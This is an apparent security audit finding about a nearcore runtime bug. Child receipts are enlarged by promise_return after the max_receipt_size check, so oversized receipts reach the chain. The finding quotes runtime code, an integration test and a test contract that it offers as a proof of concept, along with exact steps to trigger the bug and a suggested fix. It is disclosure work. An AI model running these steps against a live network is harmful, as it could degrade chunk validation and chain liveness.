### Title
Receipt Size Invariant Bypass via `promise_return` `output_data_receivers` Mutation After Validation - (File: `runtime/runtime/src/lib.rs`)

### Summary
When a contract uses `promise_return`, the runtime appends `output_data_receivers` from the parent receipt to a child receipt **after** that child receipt has already passed `max_receipt_size` validation. An unprivileged user can craft a contract that creates a receipt at exactly `max_receipt_size` bytes and then triggers `promise_return`, causing the runtime to silently produce an oversized receipt that enters the chain, violating the `max_receipt_size` invariant. The codebase explicitly acknowledges this as an open bug (nearcore issue #12606).

### Finding Description

`validate_receipt` in `runtime/runtime/src/verifier.rs` enforces `max_receipt_size` (4,194,304 bytes) only when called with `ValidateReceiptMode::NewReceipt`: [1](#0-0) 

After VM execution, `apply_action_receipt` in `runtime/runtime/src/lib.rs` handles the `promise_return` case by mutating the child receipt's `output_data_receivers` in-place: [2](#0-1) 

This mutation happens **after** the receipt was already validated by the VM logic layer. No re-validation of the receipt's total serialized size is performed after the `extend_from_slice` call. The receipt is then forwarded or buffered via `receipt_sink.forward_or_buffer_receipt` without any size re-check: [3](#0-2) 

The `ValidateReceiptMode::ExistingReceipt` mode was introduced specifically to tolerate these oversized receipts already in the chain: [4](#0-3) 

A second variant exists via value return: when a contract returns a value equal to `max_receipt_size`, the runtime wraps it in a `DataReceipt` that also exceeds the limit. [5](#0-4) 

### Impact Explanation

Oversized receipts that bypass `max_receipt_size` enter the chain and are confirmed by the test harness: [6](#0-5) 

The `ChunkStateWitness` size budget is designed around the assumption that no single receipt exceeds 4 MB. A receipt that exceeds this limit can push the total uncompressed witness size beyond the 17 MiB target, causing chunk validators to produce a divergent result and refuse to endorse the chunk. Repeated missed chunks degrade liveness. Additionally, the `per_receipt_storage_proof_size_limit` (4 MB) and `main_storage_proof_size_soft_limit` (4 MB) accounting is based on the same size invariant; an oversized receipt can cause the soft limit to be exceeded by a larger margin than the design allows (up to 8 MB + receipt overhead instead of the intended 8 MB ceiling). [7](#0-6) 

### Likelihood Explanation

Any unprivileged user who can deploy a contract can trigger this. The attack requires:
1. Deploy a contract that creates a receipt with `args` sized to fill `max_receipt_size - base_receipt_size` bytes.
2. Call `promise_return` on that receipt from within a `promise_then` chain.

The test contract `max_receipt_size_promise_return_method2` demonstrates the exact steps: [8](#0-7) 

No validator or operator privilege is required. The cost is only the gas for the function call.

### Recommendation

After the `extend_from_slice` at lines 1029–1035 of `runtime/runtime/src/lib.rs`, re-measure the serialized size of the mutated receipt and return a `NewReceiptValidationError(ReceiptSizeExceeded { … })` if it exceeds `limit_config.max_receipt_size`. This mirrors the check already applied to receipts created directly by the VM (yield path, direct `generate_large_receipt` path). The same re-check should be applied to the data-receipt path when `ReturnData::Value` is wrapped and its size would exceed `max_receipt_size`.

### Proof of Concept

The existing integration test `test_max_receipt_size_promise_return` in `test-loop-tests/src/tests/max_receipt_size.rs` is a complete, runnable proof of concept. It:
1. Deploys a contract.
2. Calls `max_receipt_size_promise_return_method1` which creates a promise DAG `[A -then-> B]` where A creates receipt C at exactly `max_receipt_size` and calls `promise_return(C)`.
3. The runtime appends B's `output_data_receivers` to C, making C exceed `max_receipt_size`.
4. `assert_oversized_receipt_occurred` confirms the oversized receipt is present in the chain. [9](#0-8)

### Citations

**File:** runtime/runtime/src/verifier.rs (L533-541)
```rust
    if mode == ValidateReceiptMode::NewReceipt {
        let receipt_size: u64 =
            borsh::object_length(receipt).unwrap().try_into().expect("Can't convert usize to u64");
        if receipt_size > limit_config.max_receipt_size {
            return Err(ReceiptValidationError::ReceiptSizeExceeded {
                size: receipt_size,
                limit: limit_config.max_receipt_size,
            });
        }
```

**File:** runtime/runtime/src/verifier.rs (L573-585)
```rust
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ValidateReceiptMode {
    /// Used for validating new receipts that were just created.
    /// More strict than `OldReceipt` mode, which has to handle older receipts.
    NewReceipt,
    /// Used for validating older receipts that were saved in the state/received. Less strict than
    /// NewReceipt validation. Tolerates some receipts that wouldn't pass new validation. It has to
    /// be less strict because:
    /// 1) Older receipts might have been created before new validation rules.
    /// 2) There is a bug which allows to create receipts that are above the size limit. Runtime has
    ///    to handle them gracefully until the receipt size limit bug is fixed.
    ///    See https://github.com/near/nearcore/issues/12606 for details.
    ExistingReceipt,
```

**File:** runtime/runtime/src/lib.rs (L1019-1037)
```rust
        if !action_receipt.output_data_receivers().is_empty() {
            if let Ok(ReturnData::ReceiptIndex(receipt_index)) = result.result {
                // Modifying a new receipt instead of sending data
                match result
                    .new_receipts
                    .get_mut(receipt_index as usize)
                    .expect("the receipt for the given receipt index should exist")
                    .receipt_mut()
                {
                    ReceiptEnum::Action(new_action_receipt)
                    | ReceiptEnum::PromiseYield(new_action_receipt) => new_action_receipt
                        .output_data_receivers
                        .extend_from_slice(&action_receipt.output_data_receivers()),
                    ReceiptEnum::ActionV2(new_action_receipt)
                    | ReceiptEnum::PromiseYieldV2(new_action_receipt) => new_action_receipt
                        .output_data_receivers
                        .extend_from_slice(&action_receipt.output_data_receivers()),
                    _ => unreachable!("the receipt should be an action receipt"),
                }
```

**File:** runtime/runtime/src/lib.rs (L1093-1100)
```rust
                    // Send out the receipt as an outgoing receipt.
                    if let Err(e) = receipt_sink.forward_or_buffer_receipt(
                        new_receipt,
                        apply_state,
                        state_update,
                    ) {
                        return Some(Err(e));
                    }
```

**File:** test-loop-tests/src/tests/max_receipt_size.rs (L124-128)
```rust
// A function call will generate a new receipt. Size of this receipt will be equal to
// `max_receipt_size`, it'll pass validation, but then `output_data_receivers` will be modified and
// the receipt's size will go above max_receipt_size. The receipt should be rejected, but currently
// isn't because of a bug (See https://github.com/near/nearcore/issues/12606)
// Runtime shouldn't die when it encounters a receipt with size above `max_receipt_size`.
```

**File:** test-loop-tests/src/tests/max_receipt_size.rs (L129-208)
```rust
#[test]
fn test_max_receipt_size_promise_return() {
    init_test_logger();

    let account = create_account_id("account0");
    let account_signer = create_user_test_signer(&account);
    let mut env = TestLoopBuilder::new()
        .enable_rpc()
        .add_user_account(&account, Balance::from_near(10_000))
        .build();

    // Deploy the test contract
    let deploy_contract_tx = SignedTransaction::deploy_contract(
        101,
        &account,
        near_test_contracts::rs_contract().into(),
        &account_signer,
        env.rpc_node().head().last_block_hash,
    );
    env.rpc_runner().run_tx(deploy_contract_tx, Duration::seconds(5));

    // User calls a contract method
    // Contract method creates a DAG with two promises: [A -then-> B]
    // When promise A is executed, it creates a third promise - `C` and does a `promise_return`.
    // The DAG changes to: [C ->then-> B]
    // The receipt for promise C is a maximum size receipt.
    // Adding the `output_data_receivers` to C's receipt makes it go over the size limit.
    let base_receipt_template = Receipt::V0(ReceiptV0 {
        predecessor_id: account.clone(),
        receiver_id: account.clone(),
        receipt_id: CryptoHash::default(),
        receipt: ReceiptEnum::Action(ActionReceipt {
            signer_id: account.clone(),
            signer_public_key: account_signer.public_key().into(),
            gas_price: Balance::ZERO,
            output_data_receivers: vec![],
            input_data_ids: vec![],
            actions: vec![Action::FunctionCall(Box::new(FunctionCallAction {
                method_name: "noop".into(),
                args: vec![],
                gas: Gas::ZERO,
                deposit: Balance::ZERO,
            }))],
        }),
    });
    let base_receipt_template = action_receipt_v1_to_latest(&base_receipt_template);
    let base_receipt_size = borsh::object_length(&base_receipt_template).unwrap();
    let max_receipt_size = 4_194_304;
    let args_size = max_receipt_size - base_receipt_size;

    // Call the contract
    let large_receipt_tx = SignedTransaction::call(
        102,
        account.clone(),
        account.clone(),
        &account_signer,
        Balance::ZERO,
        "max_receipt_size_promise_return_method1".into(),
        format!("{{\"args_size\": {}}}", args_size).into(),
        Gas::from_teragas(300),
        env.rpc_node().head().last_block_hash,
    );
    env.rpc_runner().run_tx(large_receipt_tx, Duration::seconds(5));

    // Make sure that the last promise in the DAG was called
    let assert_test_completed = SignedTransaction::call(
        103,
        account.clone(),
        account,
        &account_signer,
        Balance::ZERO,
        "assert_test_completed".into(),
        "".into(),
        Gas::from_teragas(300),
        env.rpc_node().head().last_block_hash,
    );
    env.rpc_runner().run_tx(assert_test_completed, Duration::seconds(5));

    assert_oversized_receipt_occurred(&env.validator());
}
```

**File:** test-loop-tests/src/tests/max_receipt_size.rs (L210-215)
```rust
/// Return a value that is as large as max_receipt_size. The value will be wrapped in a data receipt
/// and the data receipt will be bigger than max_receipt_size. The receipt should be rejected, but
/// currently isn't because of a bug (See https://github.com/near/nearcore/issues/12606)
/// Creates the following promise DAG:
/// A[self.return_large_value()] -then-> B[self.mark_test_completed()]
#[test]
```

**File:** runtime/runtime/src/congestion_control.rs (L58-70)
```rust
pub(crate) struct ReceiptSinkV2 {
    /// Keeps track of the local shard's congestion info while adding and
    /// removing buffered or delayed receipts. At the end of applying receipts,
    /// it will be a field in the [`ApplyResult`]. For this chunk, it is not
    /// used to make forwarding decisions.
    pub(crate) own_congestion_info: CongestionInfo,
    pub(crate) outgoing_receipts: Vec<Receipt>,
    pub(crate) outgoing_limit: HashMap<ShardId, OutgoingLimit>,
    pub(crate) outgoing_buffers: ShardsOutgoingReceiptBuffer,
    pub(crate) outgoing_metadatas: OutgoingMetadatas,
    pub(crate) bandwidth_scheduler_output: BandwidthSchedulerOutput,
    pub(crate) stats: ReceiptSinkStats,
}
```

**File:** runtime/near-test-contracts/test-contract-rs/src/lib.rs (L1915-1939)
```rust
pub unsafe fn max_receipt_size_promise_return_method2() {
    input(0);
    let mut args = vec![0u8; register_len(0) as usize];
    read_register(0, args.as_mut_ptr());
    let input_args_json: serde_json::Value = serde_json::from_slice(&args).unwrap();
    let args_size = input_args_json["args_size"].as_u64().unwrap();

    current_account_id(0);
    let current_account = vec![0u8; register_len(0) as usize];
    read_register(0, current_account.as_ptr() as _);

    let large_args = vec![0u8; args_size as usize];
    let noop_method = b"noop";
    let promise_c = promise_create(
        current_account.len() as u64,
        current_account.as_ptr() as u64,
        noop_method.len() as u64,
        noop_method.as_ptr() as u64,
        large_args.len() as u64,
        large_args.as_ptr() as u64,
        0,
        20 * TGAS,
    );

    promise_return(promise_c);
```
